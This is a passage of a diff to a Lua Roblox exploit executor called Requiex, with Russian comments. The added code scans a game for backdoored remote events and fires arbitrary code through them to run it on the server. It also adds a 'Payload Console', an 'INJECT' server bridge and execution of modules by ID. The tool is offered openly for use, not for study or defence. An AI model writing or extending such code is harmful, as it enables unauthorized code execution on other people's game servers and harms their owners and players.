+        Requiex:Log("Backdoor acquired! Use RUN to execute server code.", Colors.AccentYellow)
+        Requiex._execBackdoor = function(code)
+            for remote, cmds in pairs(self.FoundCommands) do
+                for _, cmd in ipairs(cmds) do
+                    if remote:IsA("RemoteEvent") then
+                        remote:FireServer(cmd, code)
+                    else
+                        remote:InvokeServer(cmd, code)
+                    end
+                    return true
+                end
+            end
+            return false
+        end
+    else
+        Requiex:Log("No backdoors found.", Colors.Red)
+    end
+    return any
+end
+
+function StealthBackdoor:SilentScan()
+    Requiex:Log("Scanning for backdoors...", Colors.AccentYellow)
+    self:FindRemotes()
+    if #self.BackdoorObjects > 0 then
+        Requiex:Log("Found "..#self.BackdoorObjects.." suspicious remotes, testing...", Colors.SubText)
+        self:ExploitAll()
+    else
+        Requiex:Log("No suspicious remotes detected.", Colors.Red)
+    end
+end
+
+-- ===== PAYLOAD MODULE (легковесный) =====
+local PayloadGUI = nil
+local function CreatePayloadGUI()
+    if PayloadGUI then return PayloadGUI end
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "RequiexPayload"
+    gui.ResetOnSpawn = false
+    gui.Parent = CoreGui
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0,360,0,260)
+    frame.Position = UDim2.new(0.5,-180,0.5,-130)
+    frame.BackgroundColor3 = Colors.Panel
+    frame.BackgroundTransparency = 0.1
+    frame.Visible = false
+    frame.Parent = gui
+    Instance.new("UICorner",frame).CornerRadius = UDim.new(0,10)
+    Instance.new("UIStroke",frame).Color = Colors.AccentYellow
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1,0,0,30)
+    title.BackgroundTransparency = 1
+    title.Text = "Payload Console"
+    title.TextColor3 = Colors.AccentYellow
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 14
+    title.Parent = frame
+    local codeBox = Instance.new("TextBox")
+    codeBox.Size = UDim2.new(1,-20,0.5,-20)
+    codeBox.Position = UDim2.new(0,10,0,35)
+    codeBox.BackgroundColor3 = Colors.Glass
+    codeBox.TextColor3 = Colors.White
+    codeBox.PlaceholderText = "server: print('hello')"
+    codeBox.ClearTextOnFocus = false
+    codeBox.TextXAlignment = Enum.TextXAlignment.Left
+    codeBox.Font = Enum.Font.RobotoMono
+    codeBox.TextSize = 12
+    codeBox.Parent = frame
+    Instance.new("UICorner",codeBox).CornerRadius = UDim.new(0,6)
+    local execBtn = Instance.new("TextButton")
+    execBtn.Size = UDim2.new(0,100,0,30)
+    execBtn.Position = UDim2.new(0.5,-50,0.7,0)
+    execBtn.Text = "Execute"
+    execBtn.BackgroundColor3 = Colors.AccentYellow
+    execBtn.TextColor3 = Colors.Black
+    execBtn.Font = Enum.Font.GothamBold
+    execBtn.AutoButtonColor = false
+    execBtn.Parent = frame
+    Instance.new("UICorner",execBtn).CornerRadius = UDim.new(0,6)
+    local logArea = Instance.new("ScrollingFrame")
+    logArea.Size = UDim2.new(1,-20,0.2,-10)
+    logArea.Position = UDim2.new(0,10,0.75,0)
+    logArea.BackgroundColor3 = Colors.LogBackground
+    logArea.BackgroundTransparency = 0.5
+    logArea.Parent = frame
+    Instance.new("UICorner",logArea).CornerRadius = UDim.new(0,4)
+    local logLayout = Instance.new("UIListLayout")
+    logLayout.Padding = UDim.new(0,2)
+    logLayout.Parent = logArea
+    local function payloadLog(msg, isError)
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(1,0,0,14)
+        label.BackgroundTransparency = 1
+        label.Text = msg
+        label.TextColor3 = isError and Colors.Red or Colors.SubText
+        label.TextSize = 10
+        label.Font = Enum.Font.RobotoMono
+        label.TextXAlignment = Enum.TextXAlignment.Left
+        label.Parent = logArea
+        local children = logArea:GetChildren()
+        local cnt = 0
+        for _,c in ipairs(children) do if c:IsA("TextLabel") then cnt=cnt+1 end end
+        if cnt > 25 then children[1]:Destroy() end
+        logArea.CanvasSize = UDim2.new(0,0,0,cnt*16)
+        task.wait()
+        logArea.CanvasPosition = Vector2.new(0, logArea.CanvasSize.Y.Offset)
+    end
+    execBtn.MouseButton1Click:Connect(function()
+        local code = codeBox.Text
+        if code == "" then return end
+        local target = (code:sub(1,7):lower() == "server:")
+        local realCode = target and code:sub(8) or code
+        if target and Requiex._execBackdoor then
+            if Requiex._execBackdoor(realCode) then
+                payloadLog("[Server] Executed")
+            else
+                payloadLog("[Error] Backdoor failed", true)
+            end
+        elseif not target and Requiex._execBackdoor then
+            Requiex._execBackdoor(realCode)
+            payloadLog("[Client] Executed")
+        else
+            pcall(function() require(tonumber(realCode)) end)
+            payloadLog("[Local] require("..realCode..")")
+        end
+    end)
+    SafeConnect(UserInputService, "InputBegan", function(input, gp)
+        if gp then return end
+        if input.KeyCode == Enum.KeyCode.F5 then frame.Visible = not frame.Visible end
+    end)
+    PayloadGUI = {gui = gui, frame = frame}
+    return PayloadGUI
+end
+
+-- ===== ACTION BAR =====
+local ActionBar = Instance.new("Frame")
+ActionBar.Size = UDim2.new(1,0,0,52)
+ActionBar.Position = UDim2.new(0,0,1,-58)
+ActionBar.BackgroundTransparency = 1
+ActionBar.ZIndex = 2
+ActionBar.Parent = Content
+local ActionLayout = Instance.new("UIListLayout")
+ActionLayout.FillDirection = Enum.FillDirection.Horizontal
+ActionLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+ActionLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+ActionLayout.Padding = UDim.new(0,6)
+ActionLayout.Parent = ActionBar
+local layoutOrderCounter = 1
+
+local function CreateSmallButton(icon, label, width, callback)
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0, width or 60, 0, 48)
+    btn.BackgroundColor3 = Colors.DarkGray
+    btn.BorderSizePixel = 0
+    btn.ZIndex = 2
+    btn.AutoButtonColor = false
+    btn.LayoutOrder = layoutOrderCounter
+    layoutOrderCounter = layoutOrderCounter + 1
+    btn.Parent = ActionBar
+    Instance.new("UICorner",btn).CornerRadius = UDim.new(0,9)
+    local iconLabel = Instance.new("TextLabel")
+    iconLabel.Size = UDim2.new(1,0,0,24)
+    iconLabel.Position = UDim2.new(0,0,0,6)
+    iconLabel.BackgroundTransparency = 1
+    iconLabel.Font = Enum.Font.GothamBold
+    iconLabel.Text = icon or ""
+    iconLabel.TextSize = 18
+    iconLabel.TextColor3 = Colors.SubText
+    iconLabel.TextXAlignment = Enum.TextXAlignment.Center
+    iconLabel.ZIndex = 3
+    iconLabel.Parent = btn
+    local labelText = Instance.new("TextLabel")
+    labelText.Size = UDim2.new(1,0,0,14)
+    labelText.Position = UDim2.new(0,0,0,30)
+    labelText.BackgroundTransparency = 1
+    labelText.Font = Enum.Font.Gotham
+    labelText.Text = label or ""
+    labelText.TextSize = 9
+    labelText.TextColor3 = Colors.SubText
+    labelText.TextXAlignment = Enum.TextXAlignment.Center
+    labelText.ZIndex = 3
+    labelText.Parent = btn
+    local btnStroke = Instance.new("UIStroke")
+    btnStroke.Color = Colors.Stroke
+    btnStroke.Thickness = 1
+    btnStroke.Transparency = 0.4
+    btnStroke.Parent = btn
+    SafeConnect(btn, "MouseEnter", function()
+        TweenService:Create(btn,TweenInfo.new(0.2),{BackgroundColor3 = Colors.GlassHover}):Play()
+        TweenService:Create(iconLabel,TweenInfo.new(0.2),{TextColor3 = Colors.AccentYellow}):Play()
+        TweenService:Create(labelText,TweenInfo.new(0.2),{TextColor3 = Colors.AccentYellow}):Play()
+    end)
+    SafeConnect(btn, "MouseLeave", function()
+        TweenService:Create(btn,TweenInfo.new(0.25),{BackgroundColor3 = Colors.DarkGray}):Play()
+        TweenService:Create(iconLabel,TweenInfo.new(0.2),{TextColor3 = Colors.SubText}):Play()
+        TweenService:Create(labelText,TweenInfo.new(0.2),{TextColor3 = Colors.SubText}):Play()
+    end)
+    SafeConnect(btn, "Activated", callback)
     return btn
 end
 
-CreateActionButton("R6", "🦴", function()
-    local p = Players.LocalPlayer
-    if p and p.Character then
-        local h = p.Character:FindFirstChildOfClass("Humanoid")
-        if h then pcall(function() h.RigType = Enum.HumanoidRigType.R6 end) Requix:Notify("REQUIX", "Switched to R6", 2) end
-    end
+-- Кнопки
+CreateSmallButton("↺", "RIG", 60, function()
+    SelectedRig = (SelectedRig == "R15") and "R6" or "R15"
+    Requiex:Log("Rig: "..SelectedRig, Colors.AccentYellow)
+end)
+CreateSmallButton("☰", "LIBRARY", 76, function()
+    LibOpen = not LibOpen
+    LibDrop.Visible = LibOpen
+    if LibOpen then RefreshLibrary() end
+end)
+CreateSmallButton("✧", "SETTINGS", 60, function()
+    Requiex:Log("Settings coming soon", Colors.SubText)
 end)
 
-CreateActionButton("Respawn", "🔄", function()
-    local p = Players.LocalPlayer
-    if p and p.Character then
-        local h = p.Character:FindFirstChildOfClass("Humanoid")
-        if h then h.Health = 0 Requix:Notify("REQUIX", "Respawning...", 1.5) end
-    end
+-- SCAN
+CreateSmallButton("⌕", "SCAN", 60, function()
+    StealthBackdoor:SilentScan()
 end)
 
-CreateActionButton("Settings", "⚙", function() Requix:Notify("REQUIX", "Settings coming soon", 2) end)
+-- PAYLOAD
+CreateSmallButton("⌨", "PAYLOAD", 76, function()
+    local p = CreatePayloadGUI()
+    p.frame.Visible = not p.frame.Visible
+end)
 
-local serverPage = Requix:CreateTab("Server", "🌐")
+-- SPACER
+local Spacer = Instance.new("Frame")
+Spacer.Size = UDim2.new(0,8,0,1)
+Spacer.BackgroundTransparency = 1
+Spacer.LayoutOrder = layoutOrderCounter
+layoutOrderCounter = layoutOrderCounter + 1
+Spacer.Parent = ActionBar
 
-local SInputFrame = Instance.new("Frame")
-SInputFrame.Size = UDim2.new(1,0,0,34)
-SInputFrame.Position = UDim2.new(0,0,0,4)
-SInputFrame.BackgroundColor3 = Colors.PanelLight
-SInputFrame.BackgroundTransparency = PnTrans
-SInputFrame.BorderSizePixel = 0
-SInputFrame.ZIndex = 105
-SInputFrame.Parent = serverPage
-Instance.new("UICorner",SInputFrame).CornerRadius = UDim.new(0,8)
-Instance.new("UIStroke",SInputFrame).Color = Colors.AccentBlue
-SInputFrame.UIStroke.Thickness = 1
-SInputFrame.UIStroke.Transparency = 0.3
+-- INJECT
+local InjectBtn = Instance.new("TextButton")
+InjectBtn.Size = UDim2.new(0,76,0,48)
+InjectBtn.BackgroundColor3 = Colors.DarkGray
+InjectBtn.BorderSizePixel = 0
+InjectBtn.Font = Enum.Font.GothamBold
+InjectBtn.Text = "INJECT"
+InjectBtn.TextSize = 12
+InjectBtn.TextColor3 = Colors.AccentYellow
+InjectBtn.ZIndex = 2
+InjectBtn.AutoButtonColor = false
+InjectBtn.LayoutOrder = layoutOrderCounter
+InjectBtn.Parent = ActionBar
+Instance.new("UICorner",InjectBtn).CornerRadius = UDim.new(0,9)
+local InjectStroke = Instance.new("UIStroke")
+InjectStroke.Color = Colors.AccentYellow
+InjectStroke.Thickness = 1.5
+InjectStroke.Transparency = 0.3
+InjectStroke.ZIndex = 3
+InjectStroke.Parent = InjectBtn
+local Injected = false
+local ServerFunction
+SafeConnect(InjectBtn, "MouseEnter", function()
+    if Injected then return end
+    TweenService:Create(InjectBtn,TweenInfo.new(0.2),{BackgroundColor3 = Colors.GlassHover, TextColor3 = Colors.White}):Play()
+end)
+SafeConnect(InjectBtn, "MouseLeave", function()
+    if Injected then return end
+    TweenService:Create(InjectBtn,TweenInfo.new(0.25),{BackgroundColor3 = Colors.DarkGray, TextColor3 = Colors.AccentYellow}):Play()
+end)
+SafeConnect(InjectBtn, "Activated", function()
+    if Injected then Requiex:Log("Already injected", Colors.AccentYellow) return end
+    pcall(function()
+        if ReplicatedStorage:FindFirstChild("RequiexServerBridge") then
+            ReplicatedStorage.RequiexServerBridge:Destroy()
+        end
+    end)
+    ServerFunction = Instance.new("RemoteFunction")
+    ServerFunction.Name = "RequiexServerBridge"
+    ServerFunction.Parent = ReplicatedStorage
+    Injected = true
+    InjectBtn.TextColor3 = Colors.Green
+    InjectStroke.Color = Colors.Green
+    Requiex:Log("Bridge injected", Colors.Green)
+    Requiex:SetStatus(Colors.Green)
+end)
+ActionLayout:ApplyLayout()
 
-local STextBox = Instance.new("TextBox")
-STextBox.Size = UDim2.new(1,-58,1,0)
-STextBox.Position = UDim2.new(0,0,0,0)
-STextBox.BackgroundTransparency = 1
-STextBox.Font = Enum.Font.Gotham
-STextBox.PlaceholderText = "Server Script ID..."
-STextBox.PlaceholderColor3 = Color3.fromRGB(90,90,100)
-STextBox.Text = ""
-STextBox.TextSize = 12
-STextBox.TextColor3 = Colors.Text
-STextBox.TextXAlignment = Enum.TextXAlignment.Left
-STextBox.ClearTextOnFocus = false
-STextBox.ZIndex = 107
-STextBox.Parent = SInputFrame
-Instance.new("UIPadding",STextBox).PaddingLeft = UDim.new(0,10)
+-- =====================================================
+-- Конец Части 2/3
+-- =====================================================-- =====================================================
+-- Requiex v2.4 Unified | Часть 3/3
+-- =====================================================
 
-local SExecBtn = Instance.new("TextButton")
-SExecBtn.Size = UDim2.new(0,42,0,28)
-SExecBtn.AnchorPoint = Vector2.new(1,0.5)
-SExecBtn.Position = UDim2.new(1,-4,0.5,0)
-SExecBtn.BackgroundColor3 = Colors.AccentBlue
-SExecBtn.BorderSizePixel = 0
-SExecBtn.Font = Enum.Font.GothamBold
-SExecBtn.Text = "▶"
-SExecBtn.TextSize = 14
-SExecBtn.TextColor3 = Color3.fromRGB(255,255,255)
-SExecBtn.ZIndex = 110
-SExecBtn.Parent = SInputFrame
-Instance.new("UICorner",SExecBtn).CornerRadius = UDim.new(0,6)
+-- Инициализация rig по умолчанию
+local SelectedRig = "R15"
 
-local ServerFunction = Instance.new("RemoteFunction")
-ServerFunction.Name = "RequixServerBridge"
-ServerFunction.Parent = ReplicatedStorage
+-- Сохранение
+SafeConnect(SaveBtn, "Activated", function()
+    local input = TextBox.Text:gsub("%s+","")
+    if input == "" then Requiex:Log("Save: empty input", Colors.Red) return end
+    local id = tonumber(input:match("%d+"))
+    if not id then Requiex:Log("Save: invalid ID", Colors.Red) return end
+    for _, e in ipairs(ScriptLibrary) do if e.ID == id then Requiex:Log("Already saved", Colors.AccentYellow) return end end
+    table.insert(ScriptLibrary, 1, {ID = id, Name = "#"..id})
+    if #ScriptLibrary > 30 then table.remove(ScriptLibrary) end
+    Requiex:Log("Saved: "..id, Colors.AccentYellow)
+end)
 
+-- Выполнение
 local function SendToServer(id)
-    local success, result = pcall(function() return ServerFunction:InvokeServer("execute", id) end)
-    if success then
-        if result == "OK" then Requix:Notify("REQUIX SS", "Script #" .. id .. " executed on server", 3)
-        elseif type(result) == "string" and result:match("^ERROR:") then Requix:Notify("REQUIX SS", result, 3)
-        else Requix:Notify("REQUIX SS", "Module #" .. id .. " loaded", 3) end
-    else Requix:Notify("REQUIX SS", "Failed: " .. tostring(result), 3) end
+    if not Injected or not ServerFunction then
+        Requiex:Log("Not injected", Colors.Red)
+        Requiex:SetStatus(Colors.Red)
+        return
+    end
+    local ok, result = pcall(function() return ServerFunction:InvokeServer("execute", id) end)
+    if ok then
+        if result == "OK" then Requiex:Log("Server #"..id.." OK", Colors.Green)
+        elseif type(result)=="string" and result:match("^ERROR:") then Requiex:Log("Server error", Colors.Red)
+        else Requiex:Log("Server #"..id.." loaded", Colors.AccentYellow) end
+    else
+        Requiex:Log("Bridge call failed", Colors.Red)
+        Requiex:SetStatus(Colors.Red)
+    end
 end
 
-SExecBtn.Activated:Connect(function()
-    local input = STextBox.Text:gsub("%s+", "")
-    if input == "" then Requix:Notify("REQUIX SS", "Enter an ID first", 2) return end
-    local scriptID = tonumber(input)
-    if not scriptID then Requix:Notify("REQUIX SS", "Invalid ID format", 2) return end
-    Requix:Notify("REQUIX SS", "Sending #" .. scriptID .. " to server...", 1.5)
-    SendToServer(scriptID)
-end)
-
-ExecBtn.Activated:Connect(function()
-    local input = TextBox.Text:gsub("%s+", "")
-    if input == "" then Requix:Notify("REQUIX", "Enter an ID first", 2) return end
-    local scriptID = tonumber(input)
-    if not scriptID then Requix:Notify("REQUIX", "Invalid ID format", 2) return end
-    Requix:Notify("REQUIX", "Loading #" .. scriptID .. "...", 1.5)
-
-    local alreadyExists = false
-    for _, entry in ipairs(ScriptHistory) do if entry.ID == scriptID then alreadyExists = true break end end
-    if not alreadyExists then
-        table.insert(ScriptHistory, 1, { ID = scriptID, Name = "Script #" .. scriptID })
-        if #ScriptHistory > 20 then table.remove(ScriptHistory) end
-    end
-
-    local success, result = pcall(function() return require(scriptID) end)
-    if success then Requix:Notify("REQUIX", "Module #" .. scriptID .. " loaded", 3)
-    else Requix:Notify("REQUIX", "Error: " .. tostring(result):sub(1,40), 3) end
-end)
-
-TextBox.FocusLost:Connect(function(enterPressed)
-    if enterPressed then
-        local input = TextBox.Text:gsub("%s+", "")
-        if input ~= "" and tonumber(input) then ExecBtn.Activated:Fire() end
+SafeConnect(ExecBtn, "Activated", function()
+    local input = TextBox.Text:gsub("%s+","")
+    local id = tonumber(input:match("%d+"))
+    if not id then Requiex:Log("Invalid ID", Colors.Red) return end
+    Requiex:Log("Execute #"..id, Colors.AccentYellow)
+    if Requiex._execBackdoor then
+        -- через бэкдор
+        local code = "require("..id..")"
+        if Requiex._execBackdoor(code) then
+            Requiex:Log("Backdoor executed", Colors.Green)
+        else
+            Requiex:Log("Backdoor execution failed", Colors.Red)
+        end
+    elseif Injected then
+        SendToServer(id)
+    else
+        local ok, err = pcall(function() require(id) end)
+        if ok then Requiex:Log("Local #"..id.." loaded", Colors.AccentYellow)
+        else Requiex:Log("Local error", Colors.Red) end
     end
 end)
 
-local Dragging = false
-local DragStart = nil
-local FrameStart = nil
-
-TopBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        Dragging = true; DragStart = input.Position; FrameStart = MainFrame.Position; input.Processed = true
-    end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if Dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - DragStart
-        MainFrame.Position = UDim2.new(FrameStart.X.Scale, FrameStart.X.Offset + delta.X, FrameStart.Y.Scale, FrameStart.Y.Offset + delta.Y)
-    end
-end)
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then Dragging = false end
+SafeConnect(TextBox, "FocusLost", function(enterPressed)
+    if enterPressed then ExecBtn.Activated:Fire() end
 end)
 
-MiniIcon.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        Dragging = true; DragStart = input.Position; FrameStart = MiniIcon.Position; input.Processed = true
-    end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if Dragging and MiniIcon.Visible and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        local delta = input.Position - DragStart
-        MiniIcon.Position = UDim2.new(FrameStart.X.Scale, FrameStart.X.Offset + delta.X, FrameStart.Y.Scale, FrameStart.Y.Offset + delta.Y)
-    end
-end)
-
-function Requix:Toggle() if MiniIcon.Visible then Maximize() else if MainFrame.Visible then Minimize() else Maximize() end end end
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == Enum.KeyCode.RightShift then Requix:Toggle() end
-end)
-
-function Requix:Notify(title, msg, dur)
-    dur = dur or 3
-    local nf = Instance.new("Frame")
-    nf.Size = UDim2.new(0,190,0,44)
-    nf.Position = UDim2.new(1,-200,1,-54)
-    nf.BackgroundColor3 = Colors.Panel
-    nf.BackgroundTransparency = BgTrans
-    nf.BorderSizePixel = 0
-    nf.ZIndex = 500
-    nf.Parent = ScreenGui
-    Instance.new("UICorner",nf).CornerRadius = UDim.new(0,8)
-    Instance.new("UIStroke",nf).Color = Colors.Stroke
-    nf.UIStroke.Thickness = 1
-    nf.UIStroke.Transparency = 0.4
-
-    local tl = Instance.new("TextLabel")
-    tl.Size = UDim2.new(1,-12,0,18)
-    tl.Position = UDim2.new(0,8,0,4)
-    tl.BackgroundTransparency = 1
-    tl.Font = Enum.Font.GothamBold
-    tl.Text = title or "Requix"
-    tl.TextSize = 11
-    tl.TextColor3 = Colors.AccentGreen
-    tl.TextXAlignment = Enum.TextXAlignment.Left
-    tl.ZIndex = 502
-    tl.Parent = nf
-
-    local ml = Instance.new("TextLabel")
-    ml.Size = UDim2.new(1,-12,0,16)
-    ml.Position = UDim2.new(0,8,0,22)
-    ml.BackgroundTransparency = 1
-    ml.Font = Enum.Font.Gotham
-    ml.Text = msg or ""
-    ml.TextSize = 10
-    ml.TextColor3 = Colors.SubText
-    ml.TextXAlignment = Enum.TextXAlignment.Left
-    ml.ZIndex = 502
-    ml.Parent = nf
-
-    TweenService:Create(nf, TweenInfo.new(0.2), {BackgroundTransparency = BgTrans}):Play()
-    nf:TweenPosition(UDim2.new(1,-200,1,-64), "Out", "Back", 0.3)
-    task.wait(dur)
-    nf:TweenPosition(UDim2.new(1,-200,1,-40), "In", "Quad", 0.25)
-    task.wait(0.25)
-    nf:Destroy()
+-- Перетаскивание
+local function makeDraggable(frame, handle)
+    local dragStart, frameStart
+    SafeConnect(handle, "InputBegan", function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragStart = input.Position
+            frameStart = frame.Position
+            input.Processed = true
+        end
+    end)
+    SafeConnect(UserInputService, "InputChanged", function(input)
+        if dragStart and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + delta.X, frameStart.Y.Scale, frameStart.Y.Offset + delta.Y)
+        end
+    end)
+    SafeConnect(UserInputService, "InputEnded", function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragStart = nil end
+    end)
 end
+makeDraggable(MainFrame, TopBar)
+makeDraggable(MiniIcon, MiniIcon)
 
-BlurBg.Visible = true
-Requix:Notify("REQUIX", "Server Bridge Ready", 2)
+-- Toggle
+function Requiex:Toggle()
+    if MiniIcon.Visible then Maximize() else if MainFrame.Visible then Minimize() else Maximize() end end
+end
+SafeConnect(UserInputService, "InputBegan", function(input, gp)
+    if gp then return end
+    if input.KeyCode == Enum.KeyCode.RightShift then Requiex:Toggle() end
+end)
 
-return Requix
+Requiex:SetStatus(Colors.AccentYellow)
+Requiex:Log("Ready. Use SCAN to hunt, PAYLOAD for console.", Colors.AccentYellow)
+
+return Requiex
